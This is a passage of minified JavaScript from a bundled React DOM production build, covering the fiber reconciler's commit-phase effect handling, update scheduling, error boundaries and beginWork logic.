          var tt = s.stateNode;
          s.flags & 32 && (ob(tt, ""), (s.flags &= -33));
          var nt = Uj(i);
          Wj(i, nt, tt);
          break;
        case 3:
        case 4:
          var ot = s.stateNode.containerInfo,
            st = Uj(i);
          Vj(i, st, ot);
          break;
        default:
          throw Error(p$1(161));
      }
    } catch (ft) {
      W$1(i, i.return, ft);
    }
    i.flags &= -3;
  }
  a & 4096 && (i.flags &= -4097);
}
function hk(i, a, o) {
  (V$1 = i), ik(i);
}
function ik(i, a, o) {
  for (var s = (i.mode & 1) !== 0; V$1 !== null; ) {
    var tt = V$1,
      nt = tt.child;
    if (tt.tag === 22 && s) {
      var ot = tt.memoizedState !== null || Jj;
      if (!ot) {
        var st = tt.alternate,
          ft = (st !== null && st.memoizedState !== null) || U$1;
        st = Jj;
        var ht = U$1;
        if (((Jj = ot), (U$1 = ft) && !ht))
          for (V$1 = tt; V$1 !== null; )
            (ot = V$1),
              (ft = ot.child),
              ot.tag === 22 && ot.memoizedState !== null
                ? jk(tt)
                : ft !== null
                ? ((ft.return = ot), (V$1 = ft))
                : jk(tt);
        for (; nt !== null; ) (V$1 = nt), ik(nt), (nt = nt.sibling);
        (V$1 = tt), (Jj = st), (U$1 = ht);
      }
      kk(i);
    } else
      tt.subtreeFlags & 8772 && nt !== null
        ? ((nt.return = tt), (V$1 = nt))
        : kk(i);
  }
}
function kk(i) {
  for (; V$1 !== null; ) {
    var a = V$1;
    if (a.flags & 8772) {
      var o = a.alternate;
      try {
        if (a.flags & 8772)
          switch (a.tag) {
            case 0:
            case 11:
            case 15:
              U$1 || Qj(5, a);
              break;
            case 1:
              var s = a.stateNode;
              if (a.flags & 4 && !U$1)
                if (o === null) s.componentDidMount();
                else {
                  var tt =
                    a.elementType === a.type
                      ? o.memoizedProps
                      : Ci(a.type, o.memoizedProps);
                  s.componentDidUpdate(
                    tt,
                    o.memoizedState,
                    s.__reactInternalSnapshotBeforeUpdate
                  );
                }
              var nt = a.updateQueue;
              nt !== null && sh(a, nt, s);
              break;
            case 3:
              var ot = a.updateQueue;
              if (ot !== null) {
                if (((o = null), a.child !== null))
                  switch (a.child.tag) {
                    case 5:
                      o = a.child.stateNode;
                      break;
                    case 1:
                      o = a.child.stateNode;
                  }
                sh(a, ot, o);
              }
              break;
            case 5:
              var st = a.stateNode;
              if (o === null && a.flags & 4) {
                o = st;
                var ft = a.memoizedProps;
                switch (a.type) {
                  case "button":
                  case "input":
                  case "select":
                  case "textarea":
                    ft.autoFocus && o.focus();
                    break;
                  case "img":
                    ft.src && (o.src = ft.src);
                }
              }
              break;
            case 6:
              break;
            case 4:
              break;
            case 12:
              break;
            case 13:
              if (a.memoizedState === null) {
                var ht = a.alternate;
                if (ht !== null) {
                  var gt = ht.memoizedState;
                  if (gt !== null) {
                    var St = gt.dehydrated;
                    St !== null && bd(St);
                  }
                }
              }
              break;
            case 19:
            case 17:
            case 21:
            case 22:
            case 23:
            case 25:
              break;
            default:
              throw Error(p$1(163));
          }
        U$1 || (a.flags & 512 && Rj(a));
      } catch (vt) {
        W$1(a, a.return, vt);
      }
    }
    if (a === i) {
      V$1 = null;
      break;
    }
    if (((o = a.sibling), o !== null)) {
      (o.return = a.return), (V$1 = o);
      break;
    }
    V$1 = a.return;
  }
}
function gk(i) {
  for (; V$1 !== null; ) {
    var a = V$1;
    if (a === i) {
      V$1 = null;
      break;
    }
    var o = a.sibling;
    if (o !== null) {
      (o.return = a.return), (V$1 = o);
      break;
    }
    V$1 = a.return;
  }
}
function jk(i) {
  for (; V$1 !== null; ) {
    var a = V$1;
    try {
      switch (a.tag) {
        case 0:
        case 11:
        case 15:
          var o = a.return;
          try {
            Qj(4, a);
          } catch (ft) {
            W$1(a, o, ft);
          }
          break;
        case 1:
          var s = a.stateNode;
          if (typeof s.componentDidMount == "function") {
            var tt = a.return;
            try {
              s.componentDidMount();
            } catch (ft) {
              W$1(a, tt, ft);
            }
          }
          var nt = a.return;
          try {
            Rj(a);
          } catch (ft) {
            W$1(a, nt, ft);
          }
          break;
        case 5:
          var ot = a.return;
          try {
            Rj(a);
          } catch (ft) {
            W$1(a, ot, ft);
          }
      }
    } catch (ft) {
      W$1(a, a.return, ft);
    }
    if (a === i) {
      V$1 = null;
      break;
    }
    var st = a.sibling;
    if (st !== null) {
      (st.return = a.return), (V$1 = st);
      break;
    }
    V$1 = a.return;
  }
}
var lk = Math.ceil,
  mk = ua.ReactCurrentDispatcher,
  nk = ua.ReactCurrentOwner,
  ok = ua.ReactCurrentBatchConfig,
  K$1 = 0,
  Q$1 = null,
  Y$1 = null,
  Z$1 = 0,
  fj = 0,
  ej = Uf(0),
  T$1 = 0,
  pk = null,
  rh = 0,
  qk = 0,
  rk = 0,
  sk = null,
  tk = null,
  fk = 0,
  Gj = 1 / 0,
  uk = null,
  Oi = !1,
  Pi = null,
  Ri = null,
  vk = !1,
  wk = null,
  xk = 0,
  yk = 0,
  zk = null,
  Ak = -1,
  Bk = 0;
function R$1() {
  return K$1 & 6 ? B$1() : Ak !== -1 ? Ak : (Ak = B$1());
}
function yi(i) {
  return i.mode & 1
    ? K$1 & 2 && Z$1 !== 0
      ? Z$1 & -Z$1
      : Kg.transition !== null
      ? (Bk === 0 && (Bk = yc()), Bk)
      : ((i = C$1),
        i !== 0 || ((i = window.event), (i = i === void 0 ? 16 : jd(i.type))),
        i)
    : 1;
}
function gi(i, a, o, s) {
  if (50 < yk) throw ((yk = 0), (zk = null), Error(p$1(185)));
  Ac(i, o, s),
    (!(K$1 & 2) || i !== Q$1) &&
      (i === Q$1 && (!(K$1 & 2) && (qk |= o), T$1 === 4 && Ck(i, Z$1)),
      Dk(i, s),
      o === 1 &&
        K$1 === 0 &&
        !(a.mode & 1) &&
        ((Gj = B$1() + 500), fg && jg()));
}
function Dk(i, a) {
  var o = i.callbackNode;
  wc(i, a);
  var s = uc(i, i === Q$1 ? Z$1 : 0);
  if (s === 0)
    o !== null && bc(o), (i.callbackNode = null), (i.callbackPriority = 0);
  else if (((a = s & -s), i.callbackPriority !== a)) {
    if ((o != null && bc(o), a === 1))
      i.tag === 0 ? ig(Ek.bind(null, i)) : hg(Ek.bind(null, i)),
        Jf(function () {
          !(K$1 & 6) && jg();
        }),
        (o = null);
    else {
      switch (Dc(s)) {
        case 1:
          o = fc;
          break;
        case 4:
          o = gc;
          break;
        case 16:
          o = hc;
          break;
        case 536870912:
          o = jc;
          break;
        default:
          o = hc;
      }
      o = Fk(o, Gk.bind(null, i));
    }
    (i.callbackPriority = a), (i.callbackNode = o);
  }
}
function Gk(i, a) {
  if (((Ak = -1), (Bk = 0), K$1 & 6)) throw Error(p$1(327));
  var o = i.callbackNode;
  if (Hk() && i.callbackNode !== o) return null;
  var s = uc(i, i === Q$1 ? Z$1 : 0);
  if (s === 0) return null;
  if (s & 30 || s & i.expiredLanes || a) a = Ik(i, s);
  else {
    a = s;
    var tt = K$1;
    K$1 |= 2;
    var nt = Jk();
    (Q$1 !== i || Z$1 !== a) && ((uk = null), (Gj = B$1() + 500), Kk(i, a));
    do
      try {
        Lk();
        break;
      } catch (st) {
        Mk(i, st);
      }
    while (!0);
    $g(),
      (mk.current = nt),
      (K$1 = tt),
      Y$1 !== null ? (a = 0) : ((Q$1 = null), (Z$1 = 0), (a = T$1));
  }
  if (a !== 0) {
    if (
      (a === 2 && ((tt = xc(i)), tt !== 0 && ((s = tt), (a = Nk(i, tt)))),
      a === 1)
    )
      throw ((o = pk), Kk(i, 0), Ck(i, s), Dk(i, B$1()), o);
    if (a === 6) Ck(i, s);
    else {
      if (
        ((tt = i.current.alternate),
        !(s & 30) &&
          !Ok(tt) &&
          ((a = Ik(i, s)),
          a === 2 && ((nt = xc(i)), nt !== 0 && ((s = nt), (a = Nk(i, nt)))),
          a === 1))
      )
        throw ((o = pk), Kk(i, 0), Ck(i, s), Dk(i, B$1()), o);
      switch (((i.finishedWork = tt), (i.finishedLanes = s), a)) {
        case 0:
        case 1:
          throw Error(p$1(345));
        case 2:
          Pk(i, tk, uk);
          break;
        case 3:
          if (
            (Ck(i, s),
            (s & 130023424) === s && ((a = fk + 500 - B$1()), 10 < a))
          ) {
            if (uc(i, 0) !== 0) break;
            if (((tt = i.suspendedLanes), (tt & s) !== s)) {
              R$1(), (i.pingedLanes |= i.suspendedLanes & tt);
              break;
            }
            i.timeoutHandle = Ff(Pk.bind(null, i, tk, uk), a);
            break;
          }
          Pk(i, tk, uk);
          break;
        case 4:
          if ((Ck(i, s), (s & 4194240) === s)) break;
          for (a = i.eventTimes, tt = -1; 0 < s; ) {
            var ot = 31 - oc(s);
            (nt = 1 << ot), (ot = a[ot]), ot > tt && (tt = ot), (s &= ~nt);
          }
          if (
            ((s = tt),
            (s = B$1() - s),
            (s =
              (120 > s
                ? 120
                : 480 > s
                ? 480
                : 1080 > s
                ? 1080
                : 1920 > s
                ? 1920
                : 3e3 > s
                ? 3e3
                : 4320 > s
                ? 4320
                : 1960 * lk(s / 1960)) - s),
            10 < s)
          ) {
            i.timeoutHandle = Ff(Pk.bind(null, i, tk, uk), s);
            break;
          }
          Pk(i, tk, uk);
          break;
        case 5:
          Pk(i, tk, uk);
          break;
        default:
          throw Error(p$1(329));
      }
    }
  }
  return Dk(i, B$1()), i.callbackNode === o ? Gk.bind(null, i) : null;
}
function Nk(i, a) {
  var o = sk;
  return (
    i.current.memoizedState.isDehydrated && (Kk(i, a).flags |= 256),
    (i = Ik(i, a)),
    i !== 2 && ((a = tk), (tk = o), a !== null && Fj(a)),
    i
  );
}
function Fj(i) {
  tk === null ? (tk = i) : tk.push.apply(tk, i);
}
function Ok(i) {
  for (var a = i; ; ) {
    if (a.flags & 16384) {
      var o = a.updateQueue;
      if (o !== null && ((o = o.stores), o !== null))
        for (var s = 0; s < o.length; s++) {
          var tt = o[s],
            nt = tt.getSnapshot;
          tt = tt.value;
          try {
            if (!He$1(nt(), tt)) return !1;
          } catch {
            return !1;
          }
        }
    }
    if (((o = a.child), a.subtreeFlags & 16384 && o !== null))
      (o.return = a), (a = o);
    else {
      if (a === i) break;
      for (; a.sibling === null; ) {
        if (a.return === null || a.return === i) return !0;
        a = a.return;
      }
      (a.sibling.return = a.return), (a = a.sibling);
    }
  }
  return !0;
}
function Ck(i, a) {
  for (
    a &= ~rk,
      a &= ~qk,
      i.suspendedLanes |= a,
      i.pingedLanes &= ~a,
      i = i.expirationTimes;
    0 < a;

  ) {
    var o = 31 - oc(a),
      s = 1 << o;
    (i[o] = -1), (a &= ~s);
  }
}
function Ek(i) {
  if (K$1 & 6) throw Error(p$1(327));
  Hk();
  var a = uc(i, 0);
  if (!(a & 1)) return Dk(i, B$1()), null;
  var o = Ik(i, a);
  if (i.tag !== 0 && o === 2) {
    var s = xc(i);
    s !== 0 && ((a = s), (o = Nk(i, s)));
  }
  if (o === 1) throw ((o = pk), Kk(i, 0), Ck(i, a), Dk(i, B$1()), o);
  if (o === 6) throw Error(p$1(345));
  return (
    (i.finishedWork = i.current.alternate),
    (i.finishedLanes = a),
    Pk(i, tk, uk),
    Dk(i, B$1()),
    null
  );
}
function Qk(i, a) {
  var o = K$1;
  K$1 |= 1;
  try {
    return i(a);
  } finally {
    (K$1 = o), K$1 === 0 && ((Gj = B$1() + 500), fg && jg());
  }
}
function Rk(i) {
  wk !== null && wk.tag === 0 && !(K$1 & 6) && Hk();
  var a = K$1;
  K$1 |= 1;
  var o = ok.transition,
    s = C$1;
  try {
    if (((ok.transition = null), (C$1 = 1), i)) return i();
  } finally {
    (C$1 = s), (ok.transition = o), (K$1 = a), !(K$1 & 6) && jg();
  }
}
function Hj() {
  (fj = ej.current), E(ej);
}
function Kk(i, a) {
  (i.finishedWork = null), (i.finishedLanes = 0);
  var o = i.timeoutHandle;
  if ((o !== -1 && ((i.timeoutHandle = -1), Gf(o)), Y$1 !== null))
    for (o = Y$1.return; o !== null; ) {
      var s = o;
      switch ((wg(s), s.tag)) {
        case 1:
          (s = s.type.childContextTypes), s != null && $f();
          break;
        case 3:
          zh(), E(Wf), E(H$1), Eh();
          break;
        case 5:
          Bh(s);
          break;
        case 4:
          zh();
          break;
        case 13:
          E(L$1);
          break;
        case 19:
          E(L$1);
          break;
        case 10:
          ah(s.type._context);
          break;
        case 22:
        case 23:
          Hj();
      }
      o = o.return;
    }
  if (
    ((Q$1 = i),
    (Y$1 = i = Pg(i.current, null)),
    (Z$1 = fj = a),
    (T$1 = 0),
    (pk = null),
    (rk = qk = rh = 0),
    (tk = sk = null),
    fh !== null)
  ) {
    for (a = 0; a < fh.length; a++)
      if (((o = fh[a]), (s = o.interleaved), s !== null)) {
        o.interleaved = null;
        var tt = s.next,
          nt = o.pending;
        if (nt !== null) {
          var ot = nt.next;
          (nt.next = tt), (s.next = ot);
        }
        o.pending = s;
      }
    fh = null;
  }
  return i;
}
function Mk(i, a) {
  do {
    var o = Y$1;
    try {
      if (($g(), (Fh.current = Rh), Ih)) {
        for (var s = M$1.memoizedState; s !== null; ) {
          var tt = s.queue;
          tt !== null && (tt.pending = null), (s = s.next);
        }
        Ih = !1;
      }
      if (
        ((Hh = 0),
        (O$1 = N = M$1 = null),
        (Jh = !1),
        (Kh = 0),
        (nk.current = null),
        o === null || o.return === null)
      ) {
        (T$1 = 1), (pk = a), (Y$1 = null);
        break;
      }
      e: {
        var nt = i,
          ot = o.return,
          st = o,
          ft = a;
        if (
          ((a = Z$1),
          (st.flags |= 32768),
          ft !== null && typeof ft == "object" && typeof ft.then == "function")
        ) {
          var ht = ft,
            gt = st,
            St = gt.tag;
          if (!(gt.mode & 1) && (St === 0 || St === 11 || St === 15)) {
            var vt = gt.alternate;
            vt
              ? ((gt.updateQueue = vt.updateQueue),
                (gt.memoizedState = vt.memoizedState),
                (gt.lanes = vt.lanes))
              : ((gt.updateQueue = null), (gt.memoizedState = null));
          }
          var _t = Ui(ot);
          if (_t !== null) {
            (_t.flags &= -257),
              Vi(_t, ot, st, nt, a),
              _t.mode & 1 && Si(nt, ht, a),
              (a = _t),
              (ft = ht);
            var Et = a.updateQueue;
            if (Et === null) {
              var Ct = new Set();
              Ct.add(ft), (a.updateQueue = Ct);
            } else Et.add(ft);
            break e;
          } else {
            if (!(a & 1)) {
              Si(nt, ht, a), tj();
              break e;
            }
            ft = Error(p$1(426));
          }
        } else if (I$1 && st.mode & 1) {
          var Pt = Ui(ot);
          if (Pt !== null) {
            !(Pt.flags & 65536) && (Pt.flags |= 256),
              Vi(Pt, ot, st, nt, a),
              Jg(Ji(ft, st));
            break e;
          }
        }
        (nt = ft = Ji(ft, st)),
          T$1 !== 4 && (T$1 = 2),
          sk === null ? (sk = [nt]) : sk.push(nt),
          (nt = ot);
        do {
          switch (nt.tag) {
            case 3:
              (nt.flags |= 65536), (a &= -a), (nt.lanes |= a);
              var bt = Ni(nt, ft, a);
              ph(nt, bt);
              break e;
            case 1:
              st = ft;
              var xt = nt.type,
                yt = nt.stateNode;
              if (
                !(nt.flags & 128) &&
                (typeof xt.getDerivedStateFromError == "function" ||
                  (yt !== null &&
                    typeof yt.componentDidCatch == "function" &&
                    (Ri === null || !Ri.has(yt))))
              ) {
                (nt.flags |= 65536), (a &= -a), (nt.lanes |= a);
                var wt = Qi(nt, st, a);
                ph(nt, wt);
                break e;
              }
          }
          nt = nt.return;
        } while (nt !== null);
      }
      Sk(o);
    } catch ($t) {
      (a = $t), Y$1 === o && o !== null && (Y$1 = o = o.return);
      continue;
    }
    break;
  } while (!0);
}
function Jk() {
  var i = mk.current;
  return (mk.current = Rh), i === null ? Rh : i;
}
function tj() {
  (T$1 === 0 || T$1 === 3 || T$1 === 2) && (T$1 = 4),
    Q$1 === null || (!(rh & 268435455) && !(qk & 268435455)) || Ck(Q$1, Z$1);
}
function Ik(i, a) {
  var o = K$1;
  K$1 |= 2;
  var s = Jk();
  (Q$1 !== i || Z$1 !== a) && ((uk = null), Kk(i, a));
  do
    try {
      Tk();
      break;
    } catch (tt) {
      Mk(i, tt);
    }
  while (!0);
  if (($g(), (K$1 = o), (mk.current = s), Y$1 !== null)) throw Error(p$1(261));
  return (Q$1 = null), (Z$1 = 0), T$1;
}
function Tk() {
  for (; Y$1 !== null; ) Uk(Y$1);
}
function Lk() {
  for (; Y$1 !== null && !cc(); ) Uk(Y$1);
}
function Uk(i) {
  var a = Vk(i.alternate, i, fj);
  (i.memoizedProps = i.pendingProps),
    a === null ? Sk(i) : (Y$1 = a),
    (nk.current = null);
}
function Sk(i) {
  var a = i;
  do {
    var o = a.alternate;
    if (((i = a.return), a.flags & 32768)) {
      if (((o = Ij(o, a)), o !== null)) {
        (o.flags &= 32767), (Y$1 = o);
        return;
      }
      if (i !== null)
        (i.flags |= 32768), (i.subtreeFlags = 0), (i.deletions = null);
      else {
        (T$1 = 6), (Y$1 = null);
        return;
      }
    } else if (((o = Ej(o, a, fj)), o !== null)) {
      Y$1 = o;
      return;
    }
    if (((a = a.sibling), a !== null)) {
      Y$1 = a;
      return;
    }
    Y$1 = a = i;
  } while (a !== null);
  T$1 === 0 && (T$1 = 5);
}
function Pk(i, a, o) {
  var s = C$1,
    tt = ok.transition;
  try {
    (ok.transition = null), (C$1 = 1), Wk(i, a, o, s);
  } finally {
    (ok.transition = tt), (C$1 = s);
  }
  return null;
}
function Wk(i, a, o, s) {
  do Hk();
  while (wk !== null);
  if (K$1 & 6) throw Error(p$1(327));
  o = i.finishedWork;
  var tt = i.finishedLanes;
  if (o === null) return null;
  if (((i.finishedWork = null), (i.finishedLanes = 0), o === i.current))
    throw Error(p$1(177));
  (i.callbackNode = null), (i.callbackPriority = 0);
  var nt = o.lanes | o.childLanes;
  if (
    (Bc(i, nt),
    i === Q$1 && ((Y$1 = Q$1 = null), (Z$1 = 0)),
    (!(o.subtreeFlags & 2064) && !(o.flags & 2064)) ||
      vk ||
      ((vk = !0),
      Fk(hc, function () {
        return Hk(), null;
      })),
    (nt = (o.flags & 15990) !== 0),
    o.subtreeFlags & 15990 || nt)
  ) {
    (nt = ok.transition), (ok.transition = null);
    var ot = C$1;
    C$1 = 1;
    var st = K$1;
    (K$1 |= 4),
      (nk.current = null),
      Oj(i, o),
      dk(o, i),
      Oe$1(Df),
      (dd = !!Cf),
      (Df = Cf = null),
      (i.current = o),
      hk(o),
      dc(),
      (K$1 = st),
      (C$1 = ot),
      (ok.transition = nt);
  } else i.current = o;
  if (
    (vk && ((vk = !1), (wk = i), (xk = tt)),
    (nt = i.pendingLanes),
    nt === 0 && (Ri = null),
    mc(o.stateNode),
    Dk(i, B$1()),
    a !== null)
  )
    for (s = i.onRecoverableError, o = 0; o < a.length; o++)
      (tt = a[o]), s(tt.value, { componentStack: tt.stack, digest: tt.digest });
  if (Oi) throw ((Oi = !1), (i = Pi), (Pi = null), i);
  return (
    xk & 1 && i.tag !== 0 && Hk(),
    (nt = i.pendingLanes),
    nt & 1 ? (i === zk ? yk++ : ((yk = 0), (zk = i))) : (yk = 0),
    jg(),
    null
  );
}
function Hk() {
  if (wk !== null) {
    var i = Dc(xk),
      a = ok.transition,
      o = C$1;
    try {
      if (((ok.transition = null), (C$1 = 16 > i ? 16 : i), wk === null))
        var s = !1;
      else {
        if (((i = wk), (wk = null), (xk = 0), K$1 & 6)) throw Error(p$1(331));
        var tt = K$1;
        for (K$1 |= 4, V$1 = i.current; V$1 !== null; ) {
          var nt = V$1,
            ot = nt.child;
          if (V$1.flags & 16) {
            var st = nt.deletions;
            if (st !== null) {
              for (var ft = 0; ft < st.length; ft++) {
                var ht = st[ft];
                for (V$1 = ht; V$1 !== null; ) {
                  var gt = V$1;
                  switch (gt.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Pj(8, gt, nt);
                  }
                  var St = gt.child;
                  if (St !== null) (St.return = gt), (V$1 = St);
                  else
                    for (; V$1 !== null; ) {
                      gt = V$1;
                      var vt = gt.sibling,
                        _t = gt.return;
                      if ((Sj(gt), gt === ht)) {
                        V$1 = null;
                        break;
                      }
                      if (vt !== null) {
                        (vt.return = _t), (V$1 = vt);
                        break;
                      }
                      V$1 = _t;
                    }
                }
              }
              var Et = nt.alternate;
              if (Et !== null) {
                var Ct = Et.child;
                if (Ct !== null) {
                  Et.child = null;
                  do {
                    var Pt = Ct.sibling;
                    (Ct.sibling = null), (Ct = Pt);
                  } while (Ct !== null);
                }
              }
              V$1 = nt;
            }
          }
          if (nt.subtreeFlags & 2064 && ot !== null)
            (ot.return = nt), (V$1 = ot);
          else
            e: for (; V$1 !== null; ) {
              if (((nt = V$1), nt.flags & 2048))
                switch (nt.tag) {
                  case 0:
                  case 11:
                  case 15:
                    Pj(9, nt, nt.return);
                }
              var bt = nt.sibling;
              if (bt !== null) {
                (bt.return = nt.return), (V$1 = bt);
                break e;
              }
              V$1 = nt.return;
            }
        }
        var xt = i.current;
        for (V$1 = xt; V$1 !== null; ) {
          ot = V$1;
          var yt = ot.child;
          if (ot.subtreeFlags & 2064 && yt !== null)
            (yt.return = ot), (V$1 = yt);
          else
            e: for (ot = xt; V$1 !== null; ) {
              if (((st = V$1), st.flags & 2048))
                try {
                  switch (st.tag) {
                    case 0:
                    case 11:
                    case 15:
                      Qj(9, st);
                  }
                } catch ($t) {
                  W$1(st, st.return, $t);
                }
              if (st === ot) {
                V$1 = null;
                break e;
              }
              var wt = st.sibling;
              if (wt !== null) {
                (wt.return = st.return), (V$1 = wt);
                break e;
              }
              V$1 = st.return;
            }
        }
        if (
          ((K$1 = tt),
          jg(),
          lc && typeof lc.onPostCommitFiberRoot == "function")
        )
          try {
            lc.onPostCommitFiberRoot(kc, i);
          } catch {}
        s = !0;
      }
      return s;
    } finally {
      (C$1 = o), (ok.transition = a);
    }
  }
  return !1;
}
function Xk(i, a, o) {
  (a = Ji(o, a)),
    (a = Ni(i, a, 1)),
    (i = nh(i, a, 1)),
    (a = R$1()),
    i !== null && (Ac(i, 1, a), Dk(i, a));
}
function W$1(i, a, o) {
  if (i.tag === 3) Xk(i, i, o);
  else
    for (; a !== null; ) {
      if (a.tag === 3) {
        Xk(a, i, o);
        break;
      } else if (a.tag === 1) {
        var s = a.stateNode;
        if (
          typeof a.type.getDerivedStateFromError == "function" ||
          (typeof s.componentDidCatch == "function" &&
            (Ri === null || !Ri.has(s)))
        ) {
          (i = Ji(o, i)),
            (i = Qi(a, i, 1)),
            (a = nh(a, i, 1)),
            (i = R$1()),
            a !== null && (Ac(a, 1, i), Dk(a, i));
          break;
        }
      }
      a = a.return;
    }
}
function Ti(i, a, o) {
  var s = i.pingCache;
  s !== null && s.delete(a),
    (a = R$1()),
    (i.pingedLanes |= i.suspendedLanes & o),
    Q$1 === i &&
      (Z$1 & o) === o &&
      (T$1 === 4 || (T$1 === 3 && (Z$1 & 130023424) === Z$1 && 500 > B$1() - fk)
        ? Kk(i, 0)
        : (rk |= o)),
    Dk(i, a);
}
function Yk(i, a) {
  a === 0 &&
    (i.mode & 1
      ? ((a = sc), (sc <<= 1), !(sc & 130023424) && (sc = 4194304))
      : (a = 1));
  var o = R$1();
  (i = ih(i, a)), i !== null && (Ac(i, a, o), Dk(i, o));
}
function uj(i) {
  var a = i.memoizedState,
    o = 0;
  a !== null && (o = a.retryLane), Yk(i, o);
}
function bk(i, a) {
  var o = 0;
  switch (i.tag) {
    case 13:
      var s = i.stateNode,
        tt = i.memoizedState;
      tt !== null && (o = tt.retryLane);
      break;
    case 19:
      s = i.stateNode;
      break;
    default:
      throw Error(p$1(314));
  }
  s !== null && s.delete(a), Yk(i, o);
}
var Vk;
Vk = function (i, a, o) {
  if (i !== null)
    if (i.memoizedProps !== a.pendingProps || Wf.current) dh = !0;
    else {
      if (!(i.lanes & o) && !(a.flags & 128)) return (dh = !1), yj(i, a, o);
      dh = !!(i.flags & 131072);
    }
  else (dh = !1), I$1 && a.flags & 1048576 && ug(a, ng, a.index);
  switch (((a.lanes = 0), a.tag)) {
    case 2:
      var s = a.type;
      ij(i, a), (i = a.pendingProps);
      var tt = Yf(a, H$1.current);
      ch(a, o), (tt = Nh(null, a, s, i, tt, o));
      var nt = Sh();
      return (
        (a.flags |= 1),
        typeof tt == "object" &&
        tt !== null &&
        typeof tt.render == "function" &&
        tt.$$typeof === void 0
          ? ((a.tag = 1),
            (a.memoizedState = null),
            (a.updateQueue = null),
            Zf(s) ? ((nt = !0), cg(a)) : (nt = !1),
            (a.memoizedState =
              tt.state !== null && tt.state !== void 0 ? tt.state : null),
            kh(a),
            (tt.updater = Ei),
            (a.stateNode = tt),
            (tt._reactInternals = a),
            Ii(a, s, i, o),
            (a = jj(null, a, s, !0, nt, o)))
          : ((a.tag = 0),
            I$1 && nt && vg(a),
            Xi(null, a, tt, o),
            (a = a.child)),
        a
      );
    case 16:
      s = a.elementType;
      e: {
        switch (
          (ij(i, a),
          (i = a.pendingProps),
          (tt = s._init),
          (s = tt(s._payload)),
          (a.type = s),
          (tt = a.tag = Zk(s)),
          (i = Ci(s, i)),
          tt)
        ) {
          case 0:
            a = cj(null, a, s, i, o);
            break e;
          case 1:
            a = hj(null, a, s, i, o);
            break e;
          case 11:
            a = Yi(null, a, s, i, o);
            break e;
          case 14:
            a = $i(null, a, s, Ci(s.type, i), o);
            break e;
        }
        throw Error(p$1(306, s, ""));
      }
      return a;
    case 0:
      return (
        (s = a.type),
        (tt = a.pendingProps),
        (tt = a.elementType === s ? tt : Ci(s, tt)),
        cj(i, a, s, tt, o)
      );
    case 1:
      return (
        (s = a.type),
        (tt = a.pendingProps),
        (tt = a.elementType === s ? tt : Ci(s, tt)),
        hj(i, a, s, tt, o)
      );
    case 3:
      e: {
        if ((kj(a), i === null)) throw Error(p$1(387));
        (s = a.pendingProps),
          (nt = a.memoizedState),
          (tt = nt.element),
          lh(i, a),
          qh(a, s, null, o);
        var ot = a.memoizedState;
        if (((s = ot.element), nt.isDehydrated))
          if (
            ((nt = {
              element: s,
              isDehydrated: !1,
              cache: ot.cache,
              pendingSuspenseBoundaries: ot.pendingSuspenseBoundaries,
              transitions: ot.transitions,
            }),
            (a.updateQueue.baseState = nt),
            (a.memoizedState = nt),
            a.flags & 256)
          ) {
            (tt = Ji(Error(p$1(423)), a)), (a = lj(i, a, s, o, tt));
            break e;
          } else if (s !== tt) {
            (tt = Ji(Error(p$1(424)), a)), (a = lj(i, a, s, o, tt));
            break e;
          } else
            for (
              yg = Lf(a.stateNode.containerInfo.firstChild),
                xg = a,
                I$1 = !0,
                zg = null,
                o = Vg(a, null, s, o),
                a.child = o;
              o;

            )
              (o.flags = (o.flags & -3) | 4096), (o = o.sibling);
        else {
          if ((Ig(), s === tt)) {
            a = Zi(i, a, o);
            break e;
          }
          Xi(i, a, s, o);
        }
        a = a.child;
      }
      return a;
    case 5:
      return (
        Ah(a),
        i === null && Eg(a),
        (s = a.type),
        (tt = a.pendingProps),
        (nt = i !== null ? i.memoizedProps : null),
        (ot = tt.children),
        Ef(s, tt) ? (ot = null) : nt !== null && Ef(s, nt) && (a.flags |= 32),
        gj(i, a),
        Xi(i, a, ot, o),
        a.child
      );
    case 6:
      return i === null && Eg(a), null;
    case 13:
      return oj(i, a, o);
    case 4:
      return (
        yh(a, a.stateNode.containerInfo),
        (s = a.pendingProps),
        i === null ? (a.child = Ug(a, null, s, o)) : Xi(i, a, s, o),
        a.child
      );
    case 11:
      return (
        (s = a.type),
        (tt = a.pendingProps),
        (tt = a.elementType === s ? tt : Ci(s, tt)),
        Yi(i, a, s, tt, o)
      );
    case 7:
      return Xi(i, a, a.pendingProps, o), a.child;
    case 8:
      return Xi(i, a, a.pendingProps.children, o), a.child;
    case 12:
      return Xi(i, a, a.pendingProps.children, o), a.child;
    case 10:
      e: {
        if (
          ((s = a.type._context),
          (tt = a.pendingProps),
          (nt = a.memoizedProps),
          (ot = tt.value),
          G$1(Wg, s._currentValue),
          (s._currentValue = ot),
          nt !== null)
        )
          if (He$1(nt.value, ot)) {
            if (nt.children === tt.children && !Wf.current) {
              a = Zi(i, a, o);
              break e;
            }
          } else
            for (nt = a.child, nt !== null && (nt.return = a); nt !== null; ) {
              var st = nt.dependencies;
              if (st !== null) {
                ot = nt.child;
                for (var ft = st.firstContext; ft !== null; ) {
                  if (ft.context === s) {
                    if (nt.tag === 1) {
                      (ft = mh(-1, o & -o)), (ft.tag = 2);
                      var ht = nt.updateQueue;
                      if (ht !== null) {
                        ht = ht.shared;
                        var gt = ht.pending;
                        gt === null
                          ? (ft.next = ft)
                          : ((ft.next = gt.next), (gt.next = ft)),
                          (ht.pending = ft);
                      }
                    }
                    (nt.lanes |= o),
                      (ft = nt.alternate),
                      ft !== null && (ft.lanes |= o),
                      bh(nt.return, o, a),
                      (st.lanes |= o);
                    break;
                  }
                  ft = ft.next;
                }
              } else if (nt.tag === 10)
                ot = nt.type === a.type ? null : nt.child;
              else if (nt.tag === 18) {
                if (((ot = nt.return), ot === null)) throw Error(p$1(341));
                (ot.lanes |= o),
                  (st = ot.alternate),
                  st !== null && (st.lanes |= o),
                  bh(ot, o, a),
                  (ot = nt.sibling);
              } else ot = nt.child;
              if (ot !== null) ot.return = nt;
              else
                for (ot = nt; ot !== null; ) {
                  if (ot === a) {
                    ot = null;
                    break;
                  }
                  if (((nt = ot.sibling), nt !== null)) {
                    (nt.return = ot.return), (ot = nt);
                    break;
                  }
                  ot = ot.return;
                }
              nt = ot;
            }
        Xi(i, a, tt.children, o), (a = a.child);
      }
      return a;
    case 9:
      return (
        (tt = a.type),
        (s = a.pendingProps.children),
        ch(a, o),
        (tt = eh(tt)),
        (s = s(tt)),
        (a.flags |= 1),
        Xi(i, a, s, o),
        a.child
      );
    case 14:
      return (
        (s = a.type),
        (tt = Ci(s, a.pendingProps)),
        (tt = Ci(s.type, tt)),
        $i(i, a, s, tt, o)
      );
    case 15:
